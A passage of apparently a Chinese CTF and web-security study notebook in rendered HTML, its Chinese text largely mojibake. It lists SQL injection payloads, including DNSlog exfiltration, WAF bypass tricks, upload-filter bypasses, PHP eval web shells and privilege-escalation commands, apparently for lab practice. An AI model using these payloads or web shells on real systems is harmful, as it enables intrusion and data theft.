class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.141</span>/secret?PARAM=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="PHPä¼ªåè®®"><a href="#PHPä¼ªåè®®" class="headerlink" title="PHPä¼ªåè®®"></a>PHPä¼ªåè®®<a id="PHPä¼ªåè®®"></a></h3><p><a href="https://www.cnblogs.com/wjrblogs/p/12285202.html">CTFä¸­å¸¸ç”¨çš„phpä¼ªåè®®åˆ©ç”¨ - 1ndex- - åšå®¢å›­</a></p><p><a href="https://www.cnblogs.com/endust/p/11804767.html">phpä¼ªåè®® - çœ‹ä¸å°½çš„å°˜åŸƒ - åšå®¢å›­</a></p><h3 id="windowsé•œåƒç«™"><a href="#windowsé•œåƒç«™" class="headerlink" title="windowsé•œåƒç«™"></a>windowsé•œåƒç«™</h3><ul><li><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></li></ul><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><ul><li><p><a href="https://gtfobins.github.io/">linuxå„å‘½ä»¤å¦‚ä½•ææƒ</a></p></li><li><p><a href="https://github.com/carlospolop/PEASS-ng">è‡ªåŠ¨ææƒæ£€æµ‹é¡¹ç›®</a></p></li><li><p><a href="https://www.cnblogs.com/xiaozi/p/12600258.html">ææƒè¾…åŠ©å·¥å…·ç®± - Bypass - åšå®¢å›­</a></p></li><li><p><a href="https://blog.csdn.net/qq_37407863/article/details/125574878#:~:text=%E8%BF%90%E7%BB%B4%E4%BA%BA%E5%91%98%E5%A6%82%E6%9E%9C%E5%9C%A8%E6%9C%8D,%E6%8F%90%E5%8D%87%E5%88%B0root%E3%80%82">SSHå¯†é’¥ææƒ_sshææƒ</a></p></li><li><pre><code class="hljs">find / -perm -4000 -exec ls -al &#123;&#125; \; 2&gt;/dev/null<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim"><br>  <br><br>### åå¼¹<span class="hljs-keyword">shell</span><br><br>- [åå¼¹<span class="hljs-keyword">shell</span>åŸç†å’Œå¸¸è§åå¼¹<span class="hljs-keyword">shell</span>æ–¹å¼ - çŸ¥ä¹ (zhihu.<span class="hljs-keyword">com</span>)](https://zhuanlan.zhihu.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">p</span>/<span class="hljs-number">446210083</span>)<br><br>- <span class="hljs-keyword">python</span>æ‹¿<span class="hljs-keyword">shell</span><br><br>  ```<span class="hljs-keyword">python</span><br>  <span class="hljs-keyword">python</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h3 id="åšé¢˜é‡åˆ°çš„å°çŸ¥è¯†ç‚¹"><a href="#åšé¢˜é‡åˆ°çš„å°çŸ¥è¯†ç‚¹" class="headerlink" title="åšé¢˜é‡åˆ°çš„å°çŸ¥è¯†ç‚¹"></a>åšé¢˜é‡åˆ°çš„å°çŸ¥è¯†ç‚¹</h3><ul><li><p>jsfuck(ç›´æ¥ä¸¢æ§åˆ¶å°è·‘)<img src="/2023/11/26/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/image-20230515091345012.png" alt="image-20230515091345012"></p></li><li><p>ç¯å¢ƒå˜é‡çœ‹ä¸€çœ‹ é™Œç”Ÿé“¾æ¥ç‚¹ä¸€ç‚¹</p><h5 id="httpå¤´"><a href="#httpå¤´" class="headerlink" title="httpå¤´"></a>httpå¤´</h5><ul><li>ä»£ç† via</li><li>ä¼ªé€ ip xff client-ip  X-REAL-IP</li></ul></li><li><p><a href="https://blog.csdn.net/dyw_666666/article/details/89973048">CTFå¿…å¤‡å¯†ç ç¼–ç å¤§å…¨</a></p></li><li><p>phpæ–‡ä»¶ä¸Šä¼ æ¼æ´é‡åˆ°åç¼€é™åˆ¶ ä¸ä»…å¯ä»¥é€šè¿‡.htaccess ä¹Ÿå¯ä»¥é€šè¿‡ä¸Šä¼ .user.iniæ–‡ä»¶å£°æ˜ä¸€ä¸ªæ–‡ä»¶åŒ…å«[<a href="https://blog.csdn.net/RABCDXB/article/details/113623796">SUCTF 2019]CheckIn_</a></p></li><li><p>md5è§£å¯†: md5 somd5</p></li><li><p>é‡åˆ°linuxé¶æœºç›´æ¥æ­è½½æœ¬åœ°çš„æƒ…å†µï¼Œå¼€æœºåæŒ‰shiftï¼Œé€‰ç”¨æˆ·ç•Œé¢æŒ‰eï¼Œä¿®æ”¹roä¸ºrw single init&#x3D;&#x2F;bin&#x2F;bash æŒ‰ctrl+xè¿›å…¥rootç”¨æˆ·å‘½ä»¤è¡Œ</p></li><li><p>brainfuck(ä¸€é”®è§£ç èƒ½è§£)</p></li><li><p>linuxç³»ç»Ÿå¼€æ”¾139 445ç«¯å£å¹¶ä¼´æœ‰smbæœåŠ¡ï¼Œå¯åˆ©ç”¨enum4linuxæ‰«æä¿¡æ¯</p></li><li><p><a href="https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/">FilterChainæ”»å‡»è§£æåŠåˆ©ç”¨</a></p></li><li><p><a href="https://www.anquanke.com/post/id/241148#h3-7">Proc ç›®å½•åœ¨ CTF ä¸­çš„åˆ©ç”¨</a></p></li><li><p>å›¾ç‰‡éšå†™å·¥å…·(kali)Steghide  éšå†™å¯†ç çˆ†ç ´stegseek</p></li><li><p>åå¼¹shellåè¿œç¨‹ä¸‹è½½(scp), æˆ–è€…</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">é¶æœº<br>python3 -m http.server [port]<br><br>kali<br>wget <span class="hljs-link">http://</span>[<span class="hljs-string">é¶æœºip</span>]:[port]/æ–‡ä»¶å<br></code></pre></td></tr></table></figure></li><li><p>å½“è¿”å›å€¼ä¸é¡µé¢å†…å®¹ä¸ç¬¦æ—¶ï¼Œå¯èƒ½æ˜¯é™æ€ç½‘é¡µ</p></li><li><p>æ‹¿åˆ°shellåå…ˆçœ‹history</p></li><li><p>æ‰«ç›®å½•æ—¶ï¼Œå¦‚æœç›®å½•ä¸å¯ç›´æ¥æŸ¥çœ‹ï¼Œå¯ä»¥åœ¨å­—å…¸ååŠ ä¸€ä¸ª.phpæˆ–å…¶ä»–åç¼€å†æ‰«æ–‡ä»¶ï¼Œæ¯”å¦‚</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dirb http:<span class="hljs-string">//192.168.48.141/secret</span> -X <span class="hljs-string">.php</span><br></code></pre></td></tr></table></figure></li><li><p>ç›®å½•æ‰«ä¸å‡ºå†å»çœ‹jsç­‰æœ‰æ— æ³„éœ²ä¿¡æ¯ï¼Œä¸è¡Œå°±ä¸‹è½½æºç è‡ªå·±æ‰¾æ•æ„Ÿæ–‡ä»¶(æ•°æ®åº“é…ç½®ä¹‹ç±»çš„)</p></li><li><p>å…¨ç½‘å†å²ç‰ˆæœ¬æŸ¥çœ‹ <a href="http://archive.org/web/web.php">Wayback Machine</a></p></li><li><p>æ‹¿åˆ°sshç§é’¥ä½†æ˜¯ç™»é™†ä¸ä¸Šï¼Œå¯ä»¥ç”¨å·¥å…·ä»ç§é’¥ä¸­çˆ†ç ´å‡ºå¯†ç </p></li><li><p>å‚æ•°ä¸­åŒ…å«<code>_</code>æ—¶å¯ç”¨éæ³•å­—ç¬¦<code>[</code>è¿›è¡Œæ›¿æ¢</p></li><li><p>phpå‚æ•°ä¼ é€’æ•°ç»„<code>?hint[]=your?&amp;hint[]=mine!&amp;hint[]=hint!!</code></p></li><li><p>phpå†…åµŒæ–‡æœ¬æ®µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$code</span> = <span class="hljs-string">&lt;&lt;&lt;&#x27;CODE_NAME&#x27;</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string"></span><br><span class="hljs-string">echo &#x27;Hello PHP&#x27;;</span><br><span class="hljs-string">CODE_NAME</span>;<br></code></pre></td></tr></table></figure></li></ul><h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><h3 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h3><h4 id="â­mysql-ï¼ˆphpæ³¨å…¥ï¼‰"><a href="#â­mysql-ï¼ˆphpæ³¨å…¥ï¼‰" class="headerlink" title="â­mysql ï¼ˆphpæ³¨å…¥ï¼‰"></a>â­mysql ï¼ˆphpæ³¨å…¥ï¼‰</h4><ul><li><p>åˆ¤æ–­æ³¨å…¥ç‚¹</p></li><li><p>order by çŒœæµ‹åˆ—åæ•°é‡</p></li><li><h5 id="æŠ¥é”™çŒœè§£å‡†å¤‡"><a href="#æŠ¥é”™çŒœè§£å‡†å¤‡" class="headerlink" title="æŠ¥é”™çŒœè§£å‡†å¤‡"></a>æŠ¥é”™çŒœè§£å‡†å¤‡</h5><ul><li>æ•°æ®åº“ç‰ˆæœ¬ï¼šversion()</li><li>æ•°æ®åº“åå­—ï¼šdatabase()</li><li>æ•°æ®åº“ç”¨æˆ·ï¼šuser()</li><li>æ“ä½œç³»ç»Ÿï¼š@@version_compile_os</li></ul></li><li><p>ä½ç‰ˆæœ¬ æš´åŠ›ç ´è§£</p></li><li><p>é«˜ç‰ˆæœ¬ information_schemaæ•°æ®åº“é‡Œå­˜æ”¾æœ‰æ‰€æœ‰æ•°æ®åº“åã€è¡¨åã€åˆ—åã€‚</p></li><li><p>è¡¨å  ?id&#x3D;-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D; <code>æ•°æ®åº“å</code></p></li><li><p>åˆ—å   ?id&#x3D;-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;<code>è¡¨å</code></p></li><li><p>æ•°æ®   ?id&#x3D;-1 union select 1,name,password,4 from <code>è¡¨å</code></p></li><li></li><li><p>æ³¨å…¥-&gt;æ–‡ä»¶å†™å…¥ æ–‡ä»¶è¯»å–(æ•°æ®åº“è¯­æ³•)</p></li><li><p>é­”æœ¯å¼•å·-&gt;16è¿›åˆ¶ç¼–ç  å®½å­—èŠ‚</p></li></ul><h3 id="å‚æ•°æäº¤æ³¨å…¥"><a href="#å‚æ•°æäº¤æ³¨å…¥" class="headerlink" title="å‚æ•°æäº¤æ³¨å…¥"></a>å‚æ•°æäº¤æ³¨å…¥</h3><h4 id="å‚æ•°ç±»å‹"><a href="#å‚æ•°ç±»å‹" class="headerlink" title="å‚æ•°ç±»å‹"></a>å‚æ•°ç±»å‹</h4><ul><li>æ•°å­— å­—ç¬¦ æœç´¢ json</li></ul><h4 id="è¯·æ±‚æ–¹æ³•"><a href="#è¯·æ±‚æ–¹æ³•" class="headerlink" title="è¯·æ±‚æ–¹æ³•"></a>è¯·æ±‚æ–¹æ³•</h4><ul><li>get post cookie request httpå¤´</li></ul><h3 id="å„ç§æ•°æ®åº“æ³¨å…¥åŠæ³¨å…¥å·¥å…·ä½¿ç”¨"><a href="#å„ç§æ•°æ®åº“æ³¨å…¥åŠæ³¨å…¥å·¥å…·ä½¿ç”¨" class="headerlink" title="å„ç§æ•°æ®åº“æ³¨å…¥åŠæ³¨å…¥å·¥å…·ä½¿ç”¨"></a>å„ç§æ•°æ®åº“æ³¨å…¥åŠæ³¨å…¥å·¥å…·ä½¿ç”¨</h3><h4 id="accessæ³¨å…¥-aspæ³¨å…¥"><a href="#accessæ³¨å…¥-aspæ³¨å…¥" class="headerlink" title="accessæ³¨å…¥(aspæ³¨å…¥)"></a>accessæ³¨å…¥(aspæ³¨å…¥)</h4><ul><li><p>ä¸åŒºåˆ†æ•°æ®åº“ ä¹Ÿæ— é«˜çº§åŠŸèƒ½</p></li><li><p>åº“æ–‡ä»¶ç›´æ¥å­˜æ”¾äºç½‘ç«™ç›®å½•ä¸‹(å¯çˆ†åº“)</p></li><li><p>è”åˆæŸ¥è¯¢ é€å­—çŒœè§£ ä½¿ç”¨å·¥å…·(æ¨è)</p></li><li><p>unionæ³¨å…¥  http headeræ³¨å…¥  åç§»æ³¨å…¥ç­‰</p></li><li><h5 id="è¡¥å……-è¡¨ååˆ—åçŒœè§£ä¸åˆ°"><a href="#è¡¥å……-è¡¨ååˆ—åçŒœè§£ä¸åˆ°" class="headerlink" title="è¡¥å……(è¡¨ååˆ—åçŒœè§£ä¸åˆ°)"></a>è¡¥å……(è¡¨ååˆ—åçŒœè§£ä¸åˆ°)</h5><ul><li>åˆ—å åç§»æ³¨å…¥</li><li>è¡¨å æºç å‘½åæ–¹å¼çŒœè§£</li></ul></li></ul><h4 id="msSQL-severæ³¨å…¥"><a href="#msSQL-severæ³¨å…¥" class="headerlink" title="msSQL severæ³¨å…¥"></a>msSQL severæ³¨å…¥</h4><ul><li>è·å–æ•°æ® æ–‡ä»¶è¯»å†™ æ‰§è¡Œsqlè¯­å¥</li><li>cmdå‘½ä»¤ è¿œç¨‹äº¤äº’ æ³¨å†Œè¡¨æ“ä½œ</li><li><a href="https://www.cnblogs.com/xishaonian/p/6173644.html">MSSQLæ³¨å…¥ - çæƒœå°‘å¹´æ—¶ - åšå®¢å›­ (cnblogs.com)</a></li></ul><h4 id="PostGresqlæ³¨å…¥"><a href="#PostGresqlæ³¨å…¥" class="headerlink" title="PostGresqlæ³¨å…¥"></a>PostGresqlæ³¨å…¥</h4><ul><li><a href="https://www.cnblogs.com/yilishazi/p/14710349.html">PostGresql æ³¨å…¥çŸ¥è¯†æ±‡æ€» - ä¸€ç²’ç ‚å­ - åšå®¢å›­ (cnblogs.com)</a></li></ul><h4 id="Oracleæ³¨å…¥"><a href="#Oracleæ³¨å…¥" class="headerlink" title="Oracleæ³¨å…¥"></a>Oracleæ³¨å…¥</h4><ul><li><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">ã€å®æˆ˜ã€‘Oracleæ³¨å…¥æ€»ç»“ - Carrypan - åšå®¢å›­ (cnblogs.com)</a></li></ul><h4 id="mongoDBæ³¨å…¥"><a href="#mongoDBæ³¨å…¥" class="headerlink" title="mongoDBæ³¨å…¥"></a>mongoDBæ³¨å…¥</h4><ul><li><a href="https://www.cnblogs.com/wefeng/p/11503102.html">Pythonæ“ä½œMongoDBæ–‡æ¡£æ•°æ®åº“ - wefeng - åšå®¢å›­ (cnblogs.com)</a></li><li>sqlmapæ— æ³•è¯†åˆ« éœ€è¦ç”¨nosqlattack</li></ul><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><ul><li>sqlmap -u url â€“v 3 [â€“data&#x3D;â€id&#x3D;1â€]  <a href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmapè¯¦ç»†ä½¿ç”¨æ•™ç¨‹_æ˜Ÿè½.çš„åšå®¢-CSDNåšå®¢_sqlmap</a></li><li>nosqlattack  <a href="https://github.com/youngyangyang04/NoSQLAttack">github-nosqlattack</a></li></ul><h3 id="æŸ¥è¯¢æ–¹å¼-ç›²æ³¨"><a href="#æŸ¥è¯¢æ–¹å¼-ç›²æ³¨" class="headerlink" title="æŸ¥è¯¢æ–¹å¼ ç›²æ³¨"></a>æŸ¥è¯¢æ–¹å¼ ç›²æ³¨</h3><h4 id="SQLæŸ¥è¯¢è¯­å¥"><a href="#SQLæŸ¥è¯¢è¯­å¥" class="headerlink" title="SQLæŸ¥è¯¢è¯­å¥"></a>SQLæŸ¥è¯¢è¯­å¥</h4><ul><li><p>select * from news where id&#x3D;$id</p></li><li><p>insert into news (id, url,text) values ( 2ï¼Œâ€™xâ€™,â€™$tâ€™)</p></li><li><p>delete from news where id&#x3D;$id</p></li><li><p>update user set pwd&#x3D;â€™$pâ€™ where id&#x3D;2 and username&#x3D;â€™ adminâ€™</p></li><li><p>select * from news order by $id</p></li><li><p>select id , name , price from news order by $order</p></li></ul><h4 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h4><p><a href="https://blog.csdn.net/qq_42477007/article/details/96492174">https://blog.csdn.net/qq_42477007/article/details/96492174</a></p><p>1ã€åŸºäºå¸ƒå°”çš„sQLç›²æ³¨-é€»è¾‘åˆ¤æ–­ regexp, like , ascii,left, ord , mid<br>2ã€åŸºäºæ—¶é—´çš„sQLç›²æ³¨-å»¶æ—¶åˆ¤æ–­ if ,sleep<br>3ã€åŸºäºæŠ¥é”™çš„sQLç›²æ³¨-æŠ¥é”™å›æ˜¾ floor, updatexml, extractvalue </p><ul><li><p>é¦–å…ˆäº†è§£ä¸‹updatexml()å‡½æ•°1</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">`UPDATEXML (XML_document, XPath_string, new_value);`<br><br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc<br><br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚<br><br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®<br><br>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼<br><br>æ”¹å˜XML_documentä¸­ç¬¦åˆXPATH_stringçš„å€¼<br><br>è€Œæˆ‘ä»¬çš„æ³¨å…¥è¯­å¥ä¸ºï¼š<br><br>`updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)`<br><br>å…¶ä¸­çš„concat()å‡½æ•°æ˜¯å°†å…¶è¿æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤ä¸ä¼šç¬¦åˆXPATH_stringçš„æ ¼å¼ï¼Œä»è€Œå‡ºç°æ ¼å¼é”™è¯¯ï¼Œçˆ†å‡º `@<span class="hljs-variable">@version</span>`<br></code></pre></td></tr></table></figure></li></ul><h3 id="ç‰¹æ®Šæ³¨å…¥"><a href="#ç‰¹æ®Šæ³¨å…¥" class="headerlink" title="ç‰¹æ®Šæ³¨å…¥"></a>ç‰¹æ®Šæ³¨å…¥</h3><h4 id="åŠ è§£å¯†æ³¨å…¥"><a href="#åŠ è§£å¯†æ³¨å…¥" class="headerlink" title="åŠ è§£å¯†æ³¨å…¥"></a>åŠ è§£å¯†æ³¨å…¥</h4><ul><li>å‚æ•°base64ç¼–ç åä¼ å…¥ (å¯èƒ½ä¼´æœ‰urlç¼–ç  å¦‚â€™â€™%3Dâ€™â†’â€™&#x3D;â€™)</li><li>å°†æ³¨å…¥è¯­å¥ç¼–ç åä¼ å…¥å‚æ•°</li></ul><h4 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h4><p>æ³¨å…¥çš„è¯­å¥ä¸­ ç‰¹æ®Šç¬¦å·è¢«é­”æœ¯å¼•å·è½¬ä¹‰åå‚¨å­˜åœ¨æ•°æ®åº“  å½“å…¶ä»–åœ°æ–¹é€šè¿‡æŸ¥è¯¢å¾—åˆ°è¯¥æ•°æ®å¹¶ç”¨äºæ•°æ®åº“æ“ä½œæ—¶ è§¦å‘æ³¨å…¥</p><ul><li>ç™½ç›’å®¡è®¡</li><li>å¸¸è§äºæ³¨å†Œ</li><li>è¾ƒéš¾å‘ç° ä¸å®ç”¨</li></ul><h4 id="DNSlogæ³¨å…¥"><a href="#DNSlogæ³¨å…¥" class="headerlink" title="DNSlogæ³¨å…¥"></a>DNSlogæ³¨å…¥</h4><ul><li>ceye.io</li><li>id&#x3D;1â€™ and if((select load_file(concat(â€˜\\â€˜, (select version()), â€˜.[è‡ªå·±çš„æ ‡å·].ceye.co\abcâ€™))),1,0)â€“+</li><li><a href="https://github.com/ADOOO/DnslogSqlinj">ADOOO&#x2F;DnslogSqlinj (github.com)</a></li></ul><h4 id="ä¸­è½¬æ³¨å…¥"><a href="#ä¸­è½¬æ³¨å…¥" class="headerlink" title="ä¸­è½¬æ³¨å…¥"></a>ä¸­è½¬æ³¨å…¥</h4><ul><li>å†™ä¸€ä¸ªä¸­è½¬ç½‘é¡µå®ç°å‚æ•°æ¥æ”¶ åŠ å¯† æ‹¼æ¥å¹¶å‘é€è¯·æ±‚ ä¸”ç›‘å¬è¿”å›å€¼ ç”¨æ³¨å…¥å·¥å…·å¯¹æ­¤ç½‘é¡µè¿›è¡Œæµ‹è¯•</li></ul><h4 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h4><ul><li>id&#x3D;1 â€˜;insert into users(id,username,password) values ( 39, â€˜less38 â€˜, â€˜hello â€˜)â€“+</li></ul><h3 id="wafç»•è¿‡"><a href="#wafç»•è¿‡" class="headerlink" title="wafç»•è¿‡"></a>wafç»•è¿‡</h3><h4 id="å¹²æ‰°åŒ¹é…è§„åˆ™"><a href="#å¹²æ‰°åŒ¹é…è§„åˆ™" class="headerlink" title="å¹²æ‰°åŒ¹é…è§„åˆ™"></a>å¹²æ‰°åŒ¹é…è§„åˆ™<a id="disturb"></a></h4><ul><li><pre><code class="mysql">%20union%20all%23%0a%20select%201,2,3%23 union all #  select 1,2,3#<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>  <br><br><span class="hljs-comment">#### httpå‚æ•°æ±¡æŸ“</span><br><br>- ä¸åŒçš„åç«¯ä»£ç é’ˆå¯¹å¤šä¸ªå‚æ•°æœ‰ä¸åŒçš„å–ç”¨è§„åˆ™<br><br>- ```mysql<br>  ?<span class="hljs-built_in">id</span>=1/**&amp;<span class="hljs-built_in">id</span>=-1 union <span class="hljs-keyword">select</span> 1,2,3<span class="hljs-comment">#*/</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h4 id="å†…è”æ³¨é‡Š"><a href="#å†…è”æ³¨é‡Š" class="headerlink" title="å†…è”æ³¨é‡Š"></a>å†…è”æ³¨é‡Š</h4><ul><li><pre><code class="mysql">/** ! */  é…åˆå‚æ•°æ±¡æŸ“ä½¿ç”¨â†‘<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>#### fuzz(è„šæœ¬è·‘å­—å…¸)<br><br>- [fuzz](D:\éªšå·¥å…·\fuzzdb-master)<br>- https:<span class="hljs-comment">//github.com/gh0stkey/Web-Fuzzing-Box/tree/main</span><br><br>#### ipç™½åå•(ä¿®æ”¹httpå¤´)<br><br>- x-forwarded-for<br>- x-remote-IP<br>- x-originating-IP<br>- x-remote-addr<br>- X-<span class="hljs-built_in">Real</span>-ip<br><br>#### é™æ€èµ„æº<br><br>- index.php/x.txt?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><br>#### urlç™½åå•<br><br>#### çˆ¬è™«ç™½åå•<br><br>- ä¼ªè£…æœç´¢å¼•æ“çš„æ”¶å½•çˆ¬è™«<br><br>- ç”¨äºé˜²æ­¢æ‰«æå·¥å…·è¯¯æŠ¥åŠè®¿é—®é¢‘ç‡è¿‡é«˜è¢«æ‹¦æˆª<br><br>- ```<br>  Mozilla/<span class="hljs-number">5.0</span> (compatible; Baiduspider/<span class="hljs-number">2.0</span>; +http:<span class="hljs-comment">//www.baidu.com/search/spider.html)</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h4 id="mysqlç‰ˆæœ¬å·ç»•è¿‡"><a href="#mysqlç‰ˆæœ¬å·ç»•è¿‡" class="headerlink" title="mysqlç‰ˆæœ¬å·ç»•è¿‡"></a>mysqlç‰ˆæœ¬å·ç»•è¿‡</h4><ul><li>&#x2F;*!50001 select 1,2,3 *&#x2F;  (ç‰ˆæœ¬å·å¤§äº5.0.1æ‰§è¡Œ)</li></ul><h4 id="sqlmapç»•è¿‡waf"><a href="#sqlmapç»•è¿‡waf" class="headerlink" title="sqlmapç»•è¿‡waf"></a>sqlmapç»•è¿‡waf</h4><ul><li><p><a href="https://blog.csdn.net/qq_34444097/article/details/82717357">sqlmapçš„ä½¿ç”¨ â€”- è‡ªå¸¦ç»•è¿‡è„šæœ¬tamper</a></p></li><li><p>è‡ªè¡Œç¼–å†™è„šæœ¬  <a href="#disturb">å¹²æ‰°åŒ¹é…è§„åˆ™</a></p></li><li><p>ç»“åˆçˆ¬è™«ç™½åå• <code>--user-agent=&quot;&quot;</code></p></li></ul><h3 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;<br>&lt;script language=&#x27;php&#x27;&gt; @eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><h4 id="å‰ç«¯"><a href="#å‰ç«¯" class="headerlink" title="å‰ç«¯"></a>å‰ç«¯</h4><ul><li><p>ä¸‹è½½æºç åˆ°æœ¬åœ°å¹¶åˆ é™¤jsåˆ¤æ–­è„šæœ¬</p></li><li><p>æŠ“åŒ…æ”¹æ–‡ä»¶å</p></li></ul><h4 id="åç«¯"><a href="#åç«¯" class="headerlink" title="åç«¯"></a>åç«¯</h4><h5 id="é»‘åå•"><a href="#é»‘åå•" class="headerlink" title="é»‘åå•"></a>é»‘åå•</h5><ul><li>åç¼€ç”¨å…¶ä»–æ ¼å¼æ›¿æ¢ å¦‚php5 php3</li><li>apacheæœåŠ¡å™¨ .htaccess æ–‡ä»¶æ›´æ”¹æ‰§è¡Œè§„åˆ™</li><li>å¤§å°å†™ å°¾éƒ¨ç©ºæ ¼ç¬¦ ç‚¹ç»•è¿‡ ::$DATAç»•è¿‡ pphphp</li><li>ç¬¬ä¸‰æ­¥å¤šæ¬¡ä½¿ç”¨ ç»• ä¸€æ¬¡è¿‡æ»¤</li></ul><h5 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" title="ç™½åå•"></a>ç™½åå•</h5><ul><li>MIMEä¿¡æ¯éªŒè¯ _FILES[â€˜upload_fileâ€™] [â€˜typeâ€™] &#x3D;&#x3D; â€˜image&#x2F;pngâ€™</li><li>0x00 %00 æˆªæ–­æ–‡ä»¶å(å»ºç«‹åœ¨åœ°å€)</li><li>å¦‚æœphpæ–‡ä»¶ä¸Šä¼ å¤„ç™½åå• ä¸”å­˜åœ¨æ–‡ä»¶è¯»å–å‡½æ•° å¦‚ <code>file_get_comments</code> ä¸” æœ¬åœ°å¼€æ”¾çš„æœ‰å…¶ä»–æœåŠ¡(æ¯”å¦‚redis)ï¼Œå¯ä»¥åˆ©ç”¨Pharååºåˆ—åŒ– åŸç”Ÿç±»<code>SoupClient</code> 